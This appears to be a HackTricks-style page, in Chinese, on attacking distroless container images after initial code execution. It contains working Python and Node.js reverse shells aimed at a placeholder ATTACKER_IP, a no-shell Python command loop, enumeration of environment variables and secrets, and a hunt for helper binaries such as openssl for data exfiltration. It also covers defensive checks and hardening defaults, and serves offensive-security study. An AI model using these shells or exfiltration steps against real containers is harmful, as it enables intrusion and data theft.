# Distroless Containers

{{#include ../../../banners/hacktricks-training.md}}

## 概述

**distroless** container image 是一种仅包含**运行某个特定应用所需的最小 runtime 组件**的 image，同时会有意移除通常的 distribution tooling，例如 package managers、shells 以及大量通用的 userland utilities。实际上，distroless images 通常只包含 application binary 或 runtime、其 shared libraries、certificate bundles，以及非常精简的 filesystem layout。

重点不在于 distroless 是一种新的 kernel isolation primitive。Distroless 是一种 **image design strategy**。它改变的是 container filesystem **内部**可用的内容，而不是 kernel 隔离 container 的方式。这一区别很重要，因为 distroless 主要通过减少攻击者在获得 code execution 后可利用的内容来强化环境。它不能替代 namespaces、seccomp、capabilities、AppArmor、SELinux 或任何其他 runtime isolation mechanism。

## Distroless 存在的原因

Distroless images 主要用于减少：

- image size
- image 的 operational complexity
- 可能包含 vulnerabilities 的 packages 和 binaries 数量
- 默认情况下攻击者可用的 post-exploitation tools 数量

这正是 distroless images 在 production application deployments 中很受欢迎的原因。一个不包含 shell、package manager 且几乎没有通用 tooling 的 container，通常更容易进行 operational reasoning，并且在 compromise 后更难被交互式滥用。

知名的 distroless-style image families 包括：

- Google's distroless images
- Chainguard hardened/minimal images

## Distroless 不代表什么

一个 distroless container **并不意味着**：

- 自动为 rootless
- 自动为 non-privileged
- 自动为 read-only
- 自动受到 seccomp、AppArmor 或 SELinux 保护
- 自动免受 container escape 影响

运行 distroless image 时，仍然可以使用 `--privileged`、host namespace sharing、dangerous bind mounts 或 mounted runtime socket。在这种情况下，image 可能很精简，但 container 仍可能存在灾难性的安全问题。Distroless 改变的是 **userland attack surface**，而不是 **kernel trust boundary**。

## 典型的 Operational Characteristics

当你 compromise 一个 distroless container 时，通常首先会发现，许多常见假设不再成立。可能没有 `sh`、没有 `bash`、没有 `ls`、没有 `id`、没有 `cat`，有时甚至不存在能够按照你惯用 tradecraft 方式运行的基于 libc 的环境。这会同时影响 offense 和 defense，因为缺少 tooling 会使 debugging、incident response 和 post-exploitation 变得不同。

最常见的模式包括：

- application runtime 存在，但其他内容很少
- shell-based payloads 会因没有 shell 而失败
- 常见的 enumeration one-liners 会因缺少 helper binaries 而失败
- filesystem protections（例如 read-only rootfs 或 writable tmpfs locations 上的 `noexec`）通常也会存在

这种组合通常会让人开始讨论如何 "weaponizing distroless"。

## Distroless 与 Post-Exploitation

在 distroless 环境中，主要的 offensive challenge 并不总是 initial RCE。通常更棘手的是接下来发生的事情。如果被利用的 workload 在 Python、Node.js、Java 或 Go 等 language runtime 中提供 code execution，你可能能够执行任意逻辑，但无法使用其他 Linux targets 中常见的 shell-centric workflows。

这意味着 post-exploitation 通常会转向以下三个方向之一：

1. **直接使用已有的 language runtime** 来枚举环境、打开 sockets、读取 files 或 staging additional payloads。
2. 如果 filesystem 为 read-only，或 writable locations 被挂载为 `noexec`，则**将自带的 tooling 加载到 memory 中**。
3. 如果 application 或其 dependencies 中包含意外有用的内容，则**滥用 image 中已经存在的 binaries**。

## Abuse

### 枚举已有的 Runtime

在许多 distroless containers 中没有 shell，但仍然存在 application runtime。如果 target 是 Python service，那么 Python 存在。如果 target 是 Node.js，那么 Node 存在。这通常已经提供了足够的功能来枚举 files、读取 environment variables、打开 reverse shells，并 staging in-memory execution，而完全无需调用 `/bin/sh`。

下面是一个使用 Python 的简单示例：
```bash
python3 - <<'PY'
import os, socket, subprocess
print("uid", os.getuid())
print("cwd", os.getcwd())
print("env keys", list(os.environ)[:20])
print("root files", os.listdir("/")[:30])
PY
```
一个使用 Node.js 的简单示例：
```bash
node -e 'const fs=require("fs"); console.log(process.getuid && process.getuid()); console.log(fs.readdirSync("/").slice(0,30)); console.log(Object.keys(process.env).slice(0,20));'
```
Impact:

- 获取 environment variables，通常包括 credentials 或 service endpoints
- 在没有 `/bin/ls` 的情况下进行 filesystem enumeration
- 识别可写路径和已挂载的 secrets

### 不使用 `/bin/sh` 的 Reverse Shell

如果 image 中不包含 `sh` 或 `bash`，经典的基于 shell 的 Reverse Shell 可能会立即失败。在这种情况下，请改用已安装的 language runtime。

Python reverse shell：
```bash
python3 - <<'PY'
import os,pty,socket
s=socket.socket()
s.connect(("ATTACKER_IP",4444))
for fd in (0,1,2):
os.dup2(s.fileno(),fd)
pty.spawn("/bin/sh")
PY
```
如果 `/bin/sh` 不存在，请将最后一行替换为由 Python 直接驱动的命令执行，或 Python REPL 循环。

Node reverse shell：
```bash
node -e 'var net=require("net"),cp=require("child_process");var s=net.connect(4444,"ATTACKER_IP",function(){var p=cp.spawn("/bin/sh",[]);s.pipe(p.stdin);p.stdout.pipe(s);p.stderr.pipe(s);});'
```
再次强调，如果不存在 `/bin/sh`，请直接使用 Node 的 filesystem、process 和 networking APIs，而不是生成 shell。

### Full Example：No-Shell Python Command Loop

如果 image 中有 Python 但完全没有 shell，一个简单的交互式 loop 通常就足以保持完整的 post-exploitation 能力：
```bash
python3 - <<'PY'
import os,subprocess
while True:
cmd=input("py> ")
if cmd.strip() in ("exit","quit"):
break
p=subprocess.run(cmd, shell=True, capture_output=True, text=True)
print(p.stdout, end="")
print(p.stderr, end="")
PY
```
这不需要交互式 shell binary。从攻击者的角度来看，其影响实际上与 basic shell 相同：命令执行、枚举，以及通过现有 runtime 部署后续 payload。

### In-Memory Tool Execution

Distroless images 通常会与以下配置结合使用：

- `readOnlyRootFilesystem: true`
- 可写但启用了 `noexec` 的 tmpfs，例如 `/dev/shm`
- 缺少 package management tools

这种组合使经典的“将 binary 下载到磁盘并运行”的工作流变得不可靠。在这些情况下，memory execution techniques 会成为主要方案。

对应的专门页面是：

{{#ref}}
../../linux-basics/bypass-linux-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

其中最相关的 techniques 包括：

- 通过 scripting runtimes 使用 `memfd_create` + `execve`
- DDexec / EverythingExec
- memexec
- memdlopen

### Existing Binaries Already In The Image

一些 Distroless images 仍然包含运行所必需的 binaries，而这些 binaries 在 compromise 后会变得有用。一个经常被观察到的例子是 `openssl`，因为应用有时需要它来执行 crypto 或 TLS 相关任务。

一个快速的搜索模式是：
```bash
find / -type f \( -name openssl -o -name busybox -o -name wget -o -name curl \) 2>/dev/null
```
如果存在 `openssl`，它可能可用于：

- outbound TLS connections
- 通过允许的 egress channel 进行 data exfiltration
- 通过 encoded/encrypted blobs 暂存 payload data

具体的滥用方式取决于实际安装的内容，但总体思路是：distroless 并不意味着“完全没有任何工具”；它意味着“比普通 distribution image 少得多的工具”。

## Checks

这些检查的目标是确定该 image 在实践中是否确实为 distroless，以及在 post-exploitation 阶段仍有哪些 runtime 或 helper binaries 可用。
```bash
find / -maxdepth 2 -type f 2>/dev/null | head -n 100          # Very small rootfs is common in distroless images
which sh bash ash busybox python python3 node java 2>/dev/null   # Identify which runtime or shell primitives exist
cat /etc/os-release 2>/dev/null                                # Often missing or minimal
mount | grep -E ' /( |$)|/dev/shm'                             # Check for read-only rootfs and writable tmpfs
```
这里有哪些值得关注的内容：

- 如果不存在 shell，但存在 Python 或 Node 等 runtime，post-exploitation 应转向由 runtime 驱动的执行方式。
- 如果 root filesystem 是只读的，而 `/dev/shm` 可写但带有 `noexec`，memory execution techniques 就会变得更加重要。
- 如果存在 `openssl`、`busybox` 或 `java` 等 helper binaries，它们可能提供足够的功能来 bootstrap 进一步的访问。

## Runtime Defaults

| Image / platform style | Default state | Typical behavior | Common manual weakening |
| --- | --- | --- | --- |
| Google distroless style images | 按设计采用最小化 userland | 没有 shell、没有 package manager，仅包含 application/runtime dependencies | 添加 debugging layers、sidecar shells，或复制进 busybox 或其他 tooling |
| Chainguard minimal images | 按设计采用最小化 userland | 减少 package surface，通常专注于单个 runtime 或 service | 使用 `:latest-dev` 或 debug variants，在 build 期间复制工具 |
| 使用 distroless images 的 Kubernetes workloads | 取决于 Pod config | Distroless 仅影响 userland；Pod security posture 仍取决于 Pod spec 和 runtime defaults | 添加 ephemeral debug containers、host mounts、privileged Pod settings |
| 运行 distroless images 的 Docker / Podman | 取决于 run flags | Filesystem 最小化，但 runtime security 仍取决于 flags 和 daemon configuration | `--privileged`、host namespace sharing、runtime socket mounts、writable host binds |

关键点在于，distroless 是一种 **image property**，而不是 runtime protection。它的价值来自减少 compromise 后 filesystem 内可用的内容。

## Related Pages

对于 distroless environments 中通常需要的 filesystem 和 memory-execution bypasses：

{{#ref}}
../../linux-basics/bypass-linux-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

对于仍适用于 distroless workloads 的 container runtime、socket 和 mount abuse：

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}

{{#include ../../../banners/hacktricks-training.md}}
